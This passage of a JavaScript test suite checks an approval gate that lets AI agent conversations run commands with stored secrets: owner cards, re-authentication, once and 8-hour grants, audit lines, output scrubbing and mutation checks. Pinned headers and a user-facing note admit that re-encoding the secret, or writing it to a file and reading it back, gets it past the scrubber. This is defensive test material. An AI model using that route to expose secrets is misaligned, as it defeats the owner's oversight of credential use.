  if (m5.mod) { const w5 = await world({ instance: 'cluster', askMs: 60, doorMod: m5.mod }); openRow(w5); const e5 = await runAnswered(w5, ENV('env'), { answer: null }); await e5.r; r5 = { cards: cardsOf(w5).length }; }
  ok(m5.n === 1 && r5 && r5.cards === 0, 'MUTANT «expiry settles the card done» (the 54f757df behaviour): the patch hits once and the leg goes RED — the card VANISHED on expiry; the shipped door keeps it as a late card', r5);
  const m6 = mutate('if (!q) { const lq = lateAsks.get(id); if (lq) return answerLate(lq, { answer: a, reauthed, by }); return', 'if (!q) { return', 'nolateanswer');
  let r6 = null;
  if (m6.mod) { const w6 = await world({ instance: 'cluster', askMs: 60, doorMod: m6.mod }); openRow(w6); const e6 = await runAnswered(w6, ENV('env'), { answer: null }); await e6.r; const c6 = cardsOf(w6)[0]; r6 = { ans: c6 ? w6.door.answer(c6.action.askId, { answer: 'once' }) : null }; }
  ok(m6.n === 1 && r6 && r6.ans && r6.ans.ok === false && (r6.ans.code === 'ask_expired' || r6.ans.code === 'ask_unknown'), 'MUTANT «a late answer is not handled» (the 54f757df behaviour): the patch hits once and the leg goes RED — a late «allow once» is REFUSED (no pass written); the shipped door writes a one-run pass', r6);
  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 2 })) ok(c.pass, c.name, c.detail);
}

console.log('⑧ PINS — the headers say the holes; the wiring');
{
  const door = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const routes = fs.readFileSync(path.join(REPO, 'src/routes/vault.js'), 'utf8');
  const wire = fs.readFileSync(path.join(REPO, 'src/server/mounts-plugins-wiring.js'), 'utf8');
  ok(/THE SCRUBBER IS A SIEVE/.test(door) && /WRITE-THEN-CAT IS ACCEPTED AND AUDITED/.test(door) && /NOT isolation/.test(door) && /egress fence is P1/.test(door), 'the door\'s header names §8.6\'s three holes: the same uid (not isolation), a tool sending it elsewhere (P1 egress), THE SCRUBBER IS A SIEVE — write-then-cat accepted and audited');
  const manual = fs.readFileSync(path.join(REPO, 'docs/agent/vault-manual.md'), 'utf8').replace(/\s+/g, ' ');
  ok(manual.includes('the output is scrubbed of the value\'s common spellings; a command that re-encodes it can still show it — the owner sees the whole command before it runs') && /A part of a value is never blanked; a value under 8 bytes is never used at all/.test(manual), 'the manual says what scrubbing does not promise in ONE sentence (lane vault-scrub-forms, the desk\'s q-043 M1) — and states the floor');
  ok(/THE THREE HOLES this door does NOT close/.test(routes) && /THE SCRUBBER IS A SIEVE/.test(routes) && /write-then-cat is accepted and audited/.test(routes), 'the route\'s header restates them');
  ok(/require\('\.\/vault-run-door\.js'\)\.create\(\{ dataDir: path\.join\(rootDir, 'data'\), vault, sources: vaultSources, userTodos,/.test(wire) && /agentEnv: \(\) => require\('\.\.\/agent-env\.js'\)\.agentEnv\(process\.env, \{ drop: require\('\.\.\/harness-env\.js'\)\.agentCredentialEnvNames/.test(wire) && /registerVaultRoutes\(app, \{[^\n]*run: vaultRun,/.test(wire) && /process\.once\('exit', \(\) => \{ try \{ vaultRun\.closeAll\(\); \} catch \{ \} \}\);/.test(wire) && /instanceKindOf\(process\.env/.test(wire),
    'the hub wires the door: the vault, the Vault window\'s sources, For you, agentEnv() (the harness credentials dropped), the instance\'s kind, the routes — and every child ends with the hub');
}

console.log('⑨ THE CARD ON THE PAGE — the For-you window, the popup row, the Vault window\'s switch');
{
  const L = await import(pathToFileURL(path.join(REPO, 'src/lib/inbox-window-layout.js')).href);
  const view = (always) => L.itemView({ id: 'ut-1', sessionKey: 'claude:conv-1', text: 'Lane X wants to run a command with a stored secret', detail: 'curl -s https://api.example.com', urgency: 'urgent', kind: 'action', status: 'open', createdAt: 1, options: null, reply: null,
    action: { type: 'vault-run-ask', askId: 'a'.repeat(32), always, tool: 'curl' } }, { t: (x) => x, words: 'w', detail: 'd', name: 'Lane X', origin: { origin: 'vault', label: 'Vault' }, notice: false, reply: { show: false }, ago: () => '', expires: () => '', resolvedBy: () => '' });
  const a1 = view(true).actions, a0 = view(false).actions;
  ok(a1.slice(0, 3).join() === 'hub-once,shape-always,hub-deny' && a0.slice(0, 2).join() === 'hub-once,hub-deny' && !a0.includes('shape-always') && !a1.includes('reply'), 'the For-you window: Allow once / Always for this shape / Deny first — no «always» button when the card does not offer it, no reply box', { a1, a0 });
  const read = (rel) => fs.readFileSync(path.join(REPO, rel), 'utf8');
  const row = read('src/lib/user-todos-row.js'), win = read('src/lib/inbox-window.js'), act = read('src/lib/user-todos-actions.js'), vw = read('src/lib/vault-window.js');
  ok(/const HELD_ASKS = \['hub-act-ask', 'automation-ask', 'pool-cross-provider', 'vault-run-ask', 'vault-grant-ask', 'vault-words-ask', 'vault-job-ask'\];/.test(row) && /heldAnswers\(i\)\.map/.test(row) && /type === 'vault-run-ask' \? t\('Always let this conversation use it \(these hosts\)'\)/.test(row) && /i\.action\.type === 'vault-run-ask' && i\.action\.always === false/.test(row), 'the popup row: Allow once / Always (lane vault-use-grants: «Always let this conversation use it (these hosts)» — a standing approval; not when the card offers none) / Deny');
  ok(/'shape-always': \(it\) => \(it && it\.action && it\.action\.command \? actBtn\('shape-always'.*: actBtn\('shape-always'/.test(win) && /a === 'auto-always' \|\| a === 'pool-always' \|\| a === 'shape-always' \? 'always'/.test(win), 'the For-you window\'s «Always for this shape» answers always');
  ok(/if \(\(answer === 'always' \|\| answer === 'window'\) && !revealLeftMs\(\) && !\(await askRevealPassword\(\)\)\) return false;/.test(act) && /\/api\/vault\/run\/asks\//.test(act) && /\.\.\.\(answer === 'always' \|\| answer === 'window' \? revealHeaders\(\) : \{\}\)/.test(act) && /r\.outcome === 'always'/.test(act), '«always» (and lane vault-standing-request r7\'s «Allow for 1 hour») opens 验证是你 FIRST, in the press\'s own task, and sends this page\'s window; the answer reads `outcome`');
  ok(/if \(row\.run && row\.run\.can\)/.test(vw) && /if \(on && !revealLeftMs\(\) && !\(await askRevealPassword\(\)\)\) \{ box\.checked = false; return; \}/.test(vw) && /fetchJson\('\/api\/vault\/runnable'/.test(vw), 'the Vault window: «Usable by agent runs» on a row that can be opened; ON asks 验证是你 first, OFF never');
  ok(R('src/inbox-reply.js').ANSWER_ACTION_TYPES.includes('vault-run-ask'), 'a typed reply never answers the run card — its buttons do');
  // lane vault-scrub-forms (q-043 verify M1): the card says what scrubbing does NOT promise — on the row, in the window, in three languages
  const NOTE = 'The output is scrubbed of the secret\'s common spellings; a command that re-encodes it can still show it — read the whole command before you allow it.';
  const call = "t('" + NOTE.replace(/'/g, "\\'") + "')", zh = read('src/lib/i18n-zh.js'), ja = read('src/lib/i18n-ja.js');
  ok(row.includes("(i.action.type === 'vault-run-ask' ? `<div class=\"ut-exit-note\">${escHtml(" + call + ")}</div>` : '')") && win.includes("if (!card && it.action && it.action.type === 'vault-run-ask') c.detail.append(mk('div', 'iw-run-note', " + call + "));")
    && zh.includes(JSON.stringify(NOTE) + ': "') && ja.includes(JSON.stringify(NOTE) + ': "'), 'the RUN card says what the scrubbing does not promise («…a command that re-encodes it can still show it — read the whole command before you allow it») — on the popup row and under the For-you window\'s detail, with its Chinese and Japanese');
}

console.log('⑩ THE REQUEST AND ITS GRANT (lane vault-manual-and-lock — design D4: vibespace-vault request / uses)');
{
  const w = await world();   // a LOCAL instance (a seen shape runs without its card)
  const caller = { ...w.caller, scope: 'webui-1' };   // the use law's spelling of this conversation (its vault-use conv)
  const other = { conversationId: 'conv-9', sessionKey: 'claude:conv-9', name: 'Lane Nine', cwd: w.work, scope: 'webui-9' };
  const reqsOf = () => (w.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === 'vault-grant-ask');
  const M1 = 'vault://mounts/m1/secretKey', PURPOSE = 'upload the nightly backup to my bucket';
  const r0 = await w.door.run({ caller, args: ENV('env'), cwd: w.work });
  ok(r0.code === 'entry_not_runnable' && /vibespace-vault request <vault:\/\/…> --for/.test(r0.words) && !/in the chat/.test(r0.words), 'a CLOSED entry ⇒ entry_not_runnable, its words naming `vibespace-vault request … --for` (never «ask in the chat»)', r0.words);
  const bad = [
    [{ caller, entry: M1, purpose: '' }, 'purpose_required'], [{ caller, entry: M1, purpose: 'x'.repeat(201) }, 'purpose_too_long'],
    [{ caller, entry: 'mounts/m1/secretKey', purpose: 'p' }, 'bad_reference'], [{ caller, entry: 'vault://accounts/acct1/apiKey', purpose: 'p' }, 'entry_has_its_own_door'],
    [{ caller, entry: 'vault://channels/lark1/token', purpose: 'p' }, 'entry_has_its_own_door'], [{ caller, entry: 'vault://mounts/nope/secretKey', purpose: 'p' }, 'entry_unknown'],
    [{ caller: { ...caller, job: true }, entry: M1, purpose: 'p' }, 'job_no_use'], [{ caller: { ...caller, remote: true }, entry: M1, purpose: 'p' }, 'device_road_later'],
    [{ caller: other, entry: 'vault://agent:conv-1/gh-token', purpose: 'p' }, 'use_not_granted'], [{ caller, entry: M1, purpose: 'deploy \u202eit' }, 'hidden_chars'],
  ];
  const got = bad.map(([a]) => w.door.request(a).code);
  ok(got.every((c, i) => c === bad[i][1]) && !reqsOf().length, 'refused BY NAME, nothing filed: no purpose, a purpose over 200, not a reference, a login / a channel token (their own doors), no such entry, a job, a remote conversation, ANOTHER conversation\'s own entry, a hidden character', got);
  const q1 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  const it = reqsOf()[0];
  ok(q1.ok && q1.askId && reqsOf().length === 1 && it.origin === 'vault' && it.kind === 'action' && it.urgency === 'high' && !it.expiresAt && it.text === 'Lane X asks to use a stored secret'
    && it.detail.includes('my bucket — ' + M1) && it.detail.includes(PURPOSE) && it.action.askId === q1.askId, 'the request lands ONCE: one For-you ask naming the agent, the entry (label + reference) and the purpose — urgency high, NO expiry (it waits for the owner)', it);
  const q2 = w.door.request({ caller, entry: M1, purpose: 'again, please' });
  ok(q2.code === 'request_pending' && /already asked/.test(q2.words) && reqsOf().length === 1, 'a second request for the same entry while one is open ⇒ request_pending BY NAME — still ONE ask', q2);
  const u0 = w.door.usesFor(caller);
  ok(u0.ok && u0.requests.length === 1 && u0.requests[0].entry === M1 && u0.requests[0].purpose === PURPOSE && !u0.grants.length && !w.door.usesFor(other).requests.length, 'uses names the open request to ITS conversation only');
  const GHP = ['gh', 'p_abcdefghijklmnopqrstuvwxyz0123456789'].join('');   // a token shape built at runtime (the secret scan)
  const leaky = w.door.request({ caller, entry: 'vault://app-secrets/app1/item.0.1', purpose: `push with ${GHP} please` });
  const leakIt = reqsOf().find((x) => x.action.askId === leaky.askId);
  ok(leaky.ok && leakIt && !leakIt.detail.includes(GHP) && /«redacted»/.test(leakIt.detail) && !auditOf(w).includes(GHP), 'a purpose holding a secret shape lands «redacted» in the tray and the audit (the agent\'s words are a sink too)');
  ok(w.door.answerRequest(leaky.askId, { answer: 'deny' }).outcome === 'denied' && !w.door._grants.size && !reqsOf().some((x) => x.action.askId === leaky.askId), 'deny (a click) ⇒ no grant, the ask resolved');
  const again = w.door.request({ caller, entry: 'vault://app-secrets/app1/item.0.1', purpose: 'once more' });
  ok(again.code === 'request_quiet' && /10 minutes/.test(again.words) && !reqsOf().some((x) => x.detail.includes('once more')), 'the same entry asked again right after a deny ⇒ request_quiet for 10 minutes (no card — the owner is not asked twice)', again);
  w.door._reqQuiet.clear();   // (the suite's later legs ask for it again)
  ok(w.door.answerRequest(q1.askId, { answer: 'always' }).code === 'bad_grant_answer', 'the answer is once, 8h or deny (no «always» — the per-row switch is the owner\'s always)');
  const nr = w.door.answerRequest(q1.askId, { answer: 'once' });
  ok(nr.code === 'reveal_needs_password' && reqsOf().length === 1 && !w.door._grants.size, 'Allow WITHOUT this page\'s 验证是你 ⇒ reveal_needs_password, the card stays up (a grant opens the entry as the switch does — the review: a click alone is forgeable on a hub with no sign-in)', nr);
  const g1 = w.door.answerRequest(q1.askId, { answer: 'once', reauthed: true, person: true });
  ok(g1.ok && g1.outcome === 'granted-once' && g1.grantedFor === 'once' && !reqsOf().length && w.door._grants.size === 1 && !fs.existsSync(path.join(w.dataDir, DOOR.STORE_FILE)), 'Allow once ⇒ ONE grant row, in memory only (the store file holds no grant)', g1);
  // lane wake-approve-card r4: vault-grant-ask is a DECISION ROW — its record says which of ITS verbs, and the person's stamp
  const FA = R('src/foryou-actions.js');
  const i1 = w.userTodos.get(it.id), st1 = FA.decidedStamp ? FA.decidedStamp(i1) : null;
  ok(i1 && i1.status === 'done' && i1.resolvedBy === 'granted' && i1.resolvedFact && i1.resolvedFact?.decidedBy === 'person' && i1.resolvedFact?.grantedFor === 'once' && i1.resolvedFact?.until > Date.now() && st1 && /^allowed once by you · (\d+\/\d+ )?\d\d:\d\d$/.test(st1.text), 'r4: the record says the verb — «allowed once by you · HH:MM» (r6: resolvedBy `granted` — the value every reader names — + its facts {grantedFor: once, until}, the person verdict\'s mark)', { by: i1 && i1.resolvedBy, fact: i1 && i1.resolvedFact, stamp: st1 && st1.text });
  ok(w.door.answerRequest(q1.askId, { answer: 'once', reauthed: true }).code === 'ask_settled', 'a second answer ⇒ ask_settled');
  const ro = await w.door.run({ caller: other, args: ENV('env'), cwd: w.work });
  ok(ro.code === 'entry_not_runnable', 'the grant is THAT conversation\'s — another conversation\'s run of the same entry ⇒ entry_not_runnable');
  const run1 = await runAnswered(w, ENV('env'), { caller });
  ok(run1.card && run1.r.ok && run1.r.stdout.includes('[vault:mounts/m1/secretKey]') && !leaks(run1.r.stdout + run1.r.stderr, VALUE).length, 'THE GRANT IS HONOURED BY THE RUN VERDICT: the closed entry runs for this conversation — its new shape still draws the card first (the owner sees the command), the output scrubbed', run1.r && run1.r.code);
  ok(!w.door._grants.size, 'Allow once is SPENT by that run (before it started)');
  { const i1b = w.userTodos.get(it.id), sb = FA.decidedStamp(i1b); ok(i1b.resolvedFact?.endedBy === 'used' && sb && /^allowed once · ended (\d+\/\d+ )?\d\d:\d\d$/.test(sb.text) && FA.decisionCard(i1b).state === 'ended', 'r6: A CARD FOLLOWS THE GRANT\'S LIFE — the once-grant that ran ends on its record: «allowed once · ended HH:MM» (the card\'s state ended)', { fact: i1b.resolvedFact, stamp: sb && sb.text }); }
  const run2 = await w.door.run({ caller, args: ENV('env'), cwd: w.work });
  ok(run2.code === 'grant_expired' && /its one run was used at \d{4}-\d\d-\d\d \d\d:\d\d UTC/.test(run2.words || '') && !/has not opened/.test(run2.words || ''), 'the same (now seen) shape again ⇒ refused — once is once; B-a14b: said as the approval that ENDED (its one run was used, when, how to ask again), never «not opened»', run2);
  const uses = w.door.usesFor(caller).uses;
  ok(uses.some((u) => u.outcome === 'ok' && u.entry === M1 && u.door === 'run' && u.purpose === PURPOSE && u.receipt === run1.r.receipt) && uses[0].outcome === 'grant_expired' && !w.door.usesFor(other).uses.some((u) => u.outcome === 'ok'),
    'THE USE LINES: `uses` reads back THIS conversation\'s own — the entry, the purpose its grant carried, the outcome, the run\'s receipt (one receipt: the answer, the run line, the use line), newest first; another conversation\'s are not its', uses.slice(0, 3));
  const lines = auditOf(w).split('\n').filter(Boolean).map((l) => JSON.parse(l));
  ok(lines.filter((l) => l.event === 'vault-request').length === 2 && lines.some((l) => l.event === 'vault-grant' && l.answer === 'once' && l.conv === 'webui-1') && lines.some((l) => l.event === 'vault-grant' && l.answer === 'deny') && !leaks(auditOf(w), VALUE).length, 'the audit: each request and each answer is a line (conversation, entry, purpose, answer) — never a value');
  // L3 (int331): a once-grant whose run FAILS before the child ran is NOT burned — it is restored, the agent runs it again
  const ql3 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  w.door.answerRequest(ql3.askId, { answer: 'once', reauthed: true });
  ok(w.door._grants.size === 1, 'L3 setup: a fresh once-grant opens the entry again');
  const _vL3 = ROWS.mounts[0].v; ROWS.mounts[0].v = null;   // the entry's value momentarily unreadable ⇒ the run gets entry_unknown, nothing runs
  const l3fail = await runAnswered(w, ENV('env'), { caller });
  ROWS.mounts[0].v = _vL3;
  ok(l3fail.r.code === 'entry_too_short_to_mask' && w.door._grants.size === 1, 'L3: a run that FAILS before the child ran (the value cannot be scrubbed — nothing ran) RESTORES the once-grant, it is not burned');
  const l3ok = await runAnswered(w, ENV('env'), { caller });
  ok(l3ok.r.ok && !w.door._grants.size, '…then a real run honours the restored grant once and SPENDS it (a once-grant is spent only when a child ran)');
  // 8 HOURS: every run of the conversation, until the switch goes OFF or the vault locks
  const q3 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  const i3id = reqsOf()[0] && reqsOf()[0].id;
  const g3 = w.door.answerRequest(q3.askId, { answer: '8h', reauthed: true, person: true });
  const i3 = w.userTodos.get(i3id), st3 = FA.decidedStamp ? FA.decidedStamp(i3) : null;
  ok(i3 && i3.resolvedBy === 'granted' && i3.resolvedFact?.grantedFor === '8h' && st3 && /^allowed by you for 8 h · (\d+\/\d+ )?\d\d:\d\d$/.test(st3.text) && FA.decisionCard(i3).state === 'approved', 'r4: For 8 hours ⇒ «allowed by you for 8 h · HH:MM» (the card\'s state approved) — r6: the record `granted` + {grantedFor: 8h, until} carries the duration', { by: i3 && i3.resolvedBy, stamp: st3 && st3.text });
  const ra = await w.door.run({ caller, args: ENV('env'), cwd: w.work }), rb = await w.door.run({ caller, args: ENV('env'), cwd: w.work });
  ok(g3.outcome === 'granted' && g3.grantedFor === '8h' && ra.ok && rb.ok && w.door._grants.size === 1 && [...w.door._grants.values()][0].until - Date.now() <= DOOR.GRANT_MS, 'For 8 hours ⇒ every run of the conversation (the seen shape without a card on a local instance), the grant stays — ≤ 8 hours', [ra.code, rb.code]);
  ok(w.door.request({ caller, entry: M1, purpose: 'x' }).already === 'granted' && w.door.runnableFor(caller).entries.some((e) => e.ref === M1 && e.by === 'grant') && !w.door.runnableFor(other).entries.length, 'a request for an entry already granted answers so (nothing filed); `list` names it to THAT conversation alone');
  { const i3n = w.userTodos.get(i3id), at9 = (i3n.resolvedFact?.until || 0) + 3600e3, s9 = FA.decidedStamp(i3n, { now: at9 });
    ok(FA.decisionCard(i3n, { now: at9 }).state === 'ended' && s9 && /^allowed for 8 hours · ended (\d+\/\d+ )?\d\d:\d\d$/.test(s9.text) && FA.decisionCard(i3n, { now: (i3n.resolvedFact?.until || 0) + 3 * 86400e3 }).state === 'ended', 'r6: the SAME record read at +9 h (and +3 d) ⇒ «allowed for 8 hours · ended HH:MM», the card\'s state ended (was: «allowed by you for 8 h · …», approved, for ever)', { stamp: s9 && s9.text }); }
  // B-a14b (fb-5a9b87b6e8): AN APPROVAL THAT ENDED IS SAID AS ITSELF — a second conversation's 8 hours run out: its next run names
  // the end (grant_expired: how, when, how to ask again), never «the user has not opened that entry»; `uses` lists it as ENDED
  {
    const c8 = { ...w.caller, conversationId: 'conv-8', sessionKey: 'claude:conv-8', name: 'Lane Eight', scope: 'webui-8' };
    const endedLeg = async (ww) => {
      const q8 = ww.door.request({ caller: c8, entry: M1, purpose: 'nightly backup' });
      ww.door.answerRequest(q8.askId, { answer: '8h', reauthed: true, person: true });
      const r8a = await runAnswered(ww, ENV('env'), { caller: c8 });
      const g8 = [...ww.door._grants.values()].find((g) => g.conv === 'webui-8');
      if (g8) g8.until = Date.now() - 1;   // its 8 hours ran out
      const r8b = await ww.door.run({ caller: c8, args: ENV('env'), cwd: ww.work });
      return { ranFirst: !!(r8a.r && r8a.r.ok && g8), r8b, u8: ww.door.usesFor(c8) };
    };
    const e8 = await endedLeg(w);
    ok(e8.ranFirst && e8.r8b.code === 'grant_expired' && /its 8 hours ran out at \d{4}-\d\d-\d\d \d\d:\d\d UTC/.test(e8.r8b.words || '') && /ask them again with its purpose: vibespace-vault request/.test(e8.r8b.words || '') && !/has not opened/.test(e8.r8b.words || ''),
      'the run AFTER its 8 hours names the END — grant_expired, the time, how to ask again — never «the user has not opened that entry»', e8.r8b);
    ok(e8.u8.ended.length === 1 && e8.u8.ended[0].entry === M1 && e8.u8.ended[0].endedBy === 'time' && /^\d{4}-\d\d-\d\dT/.test(e8.u8.ended[0].endedAt) && e8.u8.ended[0].purpose === 'nightly backup' && !e8.u8.grants.length && !w.door.usesFor(other).ended.length,
      '…and `uses` lists it as ENDED for that conversation only (how, when, its purpose) — never as a live grant, never in another conversation\'s', e8.u8.ended);
    const r8c = await w.door.run({ caller: other, args: ENV('env'), cwd: w.work });
    ok(r8c.code === 'entry_not_runnable', 'a conversation that never held an approval still reads entry_not_runnable (the switch is the news there)', r8c.code);
    const q8b = w.door.request({ caller: c8, entry: M1, purpose: 'nightly backup' });
    w.door.answerRequest(q8b.askId, { answer: '8h', reauthed: true, person: true });
    const r8d = await w.door.run({ caller: c8, args: ENV('env'), cwd: w.work });
    ok(r8d.ok && !w.door.usesFor(c8).ended.length && w.door.usesFor(c8).grants.length === 1, 'asked again and allowed ⇒ it runs, and the old end is no longer listed', { ok: r8d.ok, code: r8d.code });
    const SRCd = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8'), from = '  function noteEnded(g, endedBy, endedAt) {\n';
    const md = SRCd.split(from).length === 2 ? M.load('src/server/vault-run-door.js', editAnchor(SRCd, from, from + '    return;   // MUTANT: no end is kept\n', "src/server/vault-run-door.js"), 'endednote') : null;
    let mr = null;
    if (md) { const mw = await world({ doorMod: md }); mr = await endedLeg(mw); }
    ok(md && mr && mr.ranFirst && mr.r8b.code === 'entry_not_runnable', 'RED control: a door that keeps no end (the .407 shape) ⇒ the same run reads «the user has not opened that entry» — the misnamed cause the agent reported as a bug', mr && mr.r8b.code);
    // THE FIRST END STANDS (the adversarial read's must): a grant's 8-hour timer stays armed after a switch-off or a spend; when it
    // fires it must not write «its 8 hours ran out» over «revoked» (the owner's OFF) or «used» — the door's timers held by hand here
    const firstEnd = async (mod) => {
      const ww = await world(), held = [];
      ww.door = ww.mk(mod, { timers: { set: (fn, ms) => { held.push({ fn, ms }); return held.length; }, clear: () => { } } });
      const fire8h = () => { for (const h of held.filter((x) => x.ms > 3600e3)) h.fn(); };
      const qa = ww.door.request({ caller: c8, entry: M1, purpose: 'nightly backup' });
      ww.door.answerRequest(qa.askId, { answer: '8h', reauthed: true, person: true });
      openRow(ww); ww.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });   // the owner switches the entry OFF (the grant revoked)
      fire8h(); held.length = 0;
      const offList = ww.door.usesFor(c8).ended.length, offRun = (await ww.door.run({ caller: c8, args: ENV('env'), cwd: ww.work })).code;
      const wb = await world(), heldB = [];   // a fresh hub: the entry CLOSED (never switched), a once-grant spent by its run
      wb.door = wb.mk(mod, { timers: { set: (fn, ms) => { heldB.push({ fn, ms }); return heldB.length; }, clear: () => { } } });
      const qb = wb.door.request({ caller: c8, entry: M1, purpose: 'one upload' });
      wb.door.answerRequest(qb.askId, { answer: 'once', reauthed: true, person: true });
      const rb = await runAnswered(wb, ENV('env'), { caller: c8 });
      for (const h of heldB.filter((x) => x.ms > 3600e3)) h.fn();
      const used = wb.door.usesFor(c8).ended[0];
      return { offList, offRun, ranOnce: !!(rb.r && rb.r.ok), usedBy: used && used.endedBy };
    };
    const fe = await firstEnd(DOOR);
    ok(fe.offList === 0 && fe.offRun === 'entry_not_runnable', 'the owner switched the entry OFF, then the grant\'s 8-hour timer fired ⇒ no «ended» record (the OFF stands: entry_not_runnable, never «the entry was not switched off»)', fe);
    ok(fe.ranOnce && fe.usedBy === 'used', 'a once-grant spent by its run, then its timer fired ⇒ the end stays «its one run was used»', fe);
    const SRCf = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8'), g0 = '    if (g && g.endedBy) return;\n';
    const mf = SRCf.split(g0).length === 2 ? M.load('src/server/vault-run-door.js', anchored(editAnchor(SRCf, g0, '', "src/server/vault-run-door.js"), "grantEnded(g, g && g.spent ? 'used' : 'time')", "grantEnded(g, 'time')", 'test-vault-run B-a14b: the first shape — no guard, the timer says time'), 'firstend') : null;   // B-a14b: a spent once-grant's timer says «used» by itself now — the batch's first shape is BOTH (no guard, the timer's «time»)
    const fr = mf ? await firstEnd(mf) : null;
    ok(!!(mf && fr && fr.usedBy === 'time'), 'RED control: no first-end guard (the batch\'s first shape) ⇒ the timer writes «its 8 hours ran out» over the spent run', fr);
    // the OFF half takes BOTH guards away: the first-end guard AND the list's «an OFF after the approval is the owner's news» —
    // either alone keeps the OFF from reading as «ran out» (the restack's tb run showed the one-guard mutant listing nothing there)
    const f0 = " && !(dOn && dOn.suspended && dOn.suspended.has(e.id) && offSinceOf(dOn, e.id) >= e.grantAt)";   // (B-a14b remainder: the OFF's time read through offSinceOf)
    const mf2 = SRCf.split(g0).length === 2 && SRCf.split(f0).length === 2 ? M.load('src/server/vault-run-door.js', anchored(editAnchor(editAnchor(SRCf, g0, '', "src/server/vault-run-door.js"), f0, '', "src/server/vault-run-door.js"), "      if (offAt.has(id) && (offAt.get(id) || 0) >= (Number(g.at) || 0)) continue;", '', 'test-vault-run B-a14b: no OFF skip at the record'), 'firstend-off') : null;   // B-a14b: the OFF after the approval is skipped at the RECORD too now — the third guard taken away with the two
    const fr2 = mf2 ? await firstEnd(mf2) : null;
    ok(!!(mf2 && fr2 && fr2.offList === 1), 'RED control: no first-end guard AND no «an OFF after the approval» filter ⇒ the timer\'s «its 8 hours ran out» is listed over the owner\'s OFF', fr2);
    // B-a14b (主开发 r542) 1: a ONCE-grant a run SPENT and still runs on when its 8 hours end ⇒ its end is «used» (the run took it),
    // never «its 8 hours ran out» — the timer fired WHILE the run ran (a run held open: the printer's `sleep`, ended by its caller
    // going away). RED: the timer that says «time» for a spent once-grant (the release)
    const SRCa = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const longRun = async (mod) => {
      const wl = await world(), heldL = [];
      wl.door = wl.mk(mod, { timers: { set: (fn, ms) => { heldL.push({ fn, ms }); return heldL.length; }, clear: () => { } } });
      const ql = wl.door.request({ caller: c8, entry: M1, purpose: 'one long upload' });
      wl.door.answerRequest(ql.askId, { answer: 'once', reauthed: true, person: true });
      const ac = new AbortController(), pidF = path.join(wl.work, 'long.pid');
      const pr = wl.door.run({ caller: c8, args: ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'sleep', pidF], cwd: wl.work, signal: ac.signal });
      const c0 = await waitCard(wl); if (c0) wl.door.answer(c0.action.askId, { answer: 'once' });   // the run's new shape draws its card (as runAnswered answers it)
      for (let k = 0; k < 1000 && !fs.existsSync(pidF); k++) await sleep(10);   // the child RAN (its pid written) — the run is in flight (bound 10 s: a loaded box)
      const running = fs.existsSync(pidF);
      for (const h of heldL.filter((x) => x.ms > 3600e3)) h.fn();   // its 8 hours end now, while the run that spent it runs on
      const mid = (wl.door.usesFor(c8).ended[0] || {}).endedBy || null;
      ac.abort(); const rr = await pr;
      return { running, mid, after: (wl.door.usesFor(c8).ended[0] || {}).endedBy || null, code: rr.code };
    };
    const lr = await longRun(DOOR);
    ok(lr.running && lr.mid === 'used' && lr.after === 'used', `B-a14b: a once-grant SPENT by a run that outlives its 8 hours ends «used» (the timer fired mid-run), never «ran out» — ${JSON.stringify(lr)}`, lr);
    const mlr = M.load('src/server/vault-run-door.js', anchored(SRCa, "grantEnded(g, g && g.spent ? 'used' : 'time')", "grantEnded(g, 'time')", 'test-vault-run B-a14b: the timer says time'), 'a14b-time');
    const lrr = await longRun(mlr);
    ok(lrr.running && lrr.mid === 'time', `RED control: the timer that says «time» for a spent once-grant ⇒ «its 8 hours ran out» over the run that used it — ${JSON.stringify(lrr)}`, lrr);
    // B-a14b 3: A RESTART KEEPS THE ENDS — an end written (data/vault-grant-ends.json, through the store writer: its own durable()
    // is the wait), then a NEW door over the same data (a restart) lists it; bytes that do not parse are set aside, never written
    // over. REDs: the ends kept in memory only (the release); a corrupt file read as empty and written over
    const SW = R('src/store-writer.js').storeWriter();
    const restartLeg = async (mod) => {
      const wr = await world(), heldR = [];
      wr.door = wr.mk(mod, { timers: { set: (fn, ms) => { heldR.push({ fn, ms }); return heldR.length; }, clear: () => { } } });
      const qr = wr.door.request({ caller: c8, entry: M1, purpose: 'nightly backup' });
      wr.door.answerRequest(qr.askId, { answer: '8h', reauthed: true, person: true });
      for (const h of heldR.filter((x) => x.ms > 3600e3)) h.fn();   // its 8 hours end
      const before = wr.door.usesFor(c8).ended.length;
      const landed = await SW.durable(path.join(wr.dataDir, 'vault-grant-ends.json'));
      wr.door = wr.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // THE RESTART: a new door over the same data
      const e0 = wr.door.usesFor(c8).ended[0] || null;
      return { before, landed, file: fs.existsSync(path.join(wr.dataDir, 'vault-grant-ends.json')), afterRestart: e0 ? { endedBy: e0.endedBy, purpose: e0.purpose, entry: e0.entry } : null };
    };
    const rs = await restartLeg(DOOR);
    ok(rs.before === 1 && rs.landed && rs.file && rs.afterRestart && rs.afterRestart.endedBy === 'time' && rs.afterRestart.purpose === 'nightly backup' && rs.afterRestart.entry === M1,
      `B-a14b: A RESTART KEEPS THE ENDS — the end written through the store writer, a new door over the same data lists it (how, its purpose) — ${JSON.stringify(rs)}`, rs);
    const mrs = M.load('src/server/vault-run-door.js', anchored(SRCa, 'w.dirty(ENDS_FILE, {', 'void (ENDS_FILE, {', 'test-vault-run B-a14b: ends in memory only'), 'a14b-memory');
    const rsr = await restartLeg(mrs);
    ok(rsr.before === 1 && !rsr.afterRestart, `RED control: the ends kept in memory only (the release) ⇒ a restart forgets the end — ${JSON.stringify(rsr)}`, rsr);
    const corruptLeg = async (mod) => {
      const wc = await world(), f = path.join(wc.dataDir, 'vault-grant-ends.json'), bytes = '{ "ends": [ not json';
      fs.writeFileSync(f, bytes, { mode: 0o600 });
      const heldC = [];
      wc.door = wc.mk(mod, { timers: { set: (fn, ms) => { heldC.push({ fn, ms }); return heldC.length; }, clear: () => { } } });
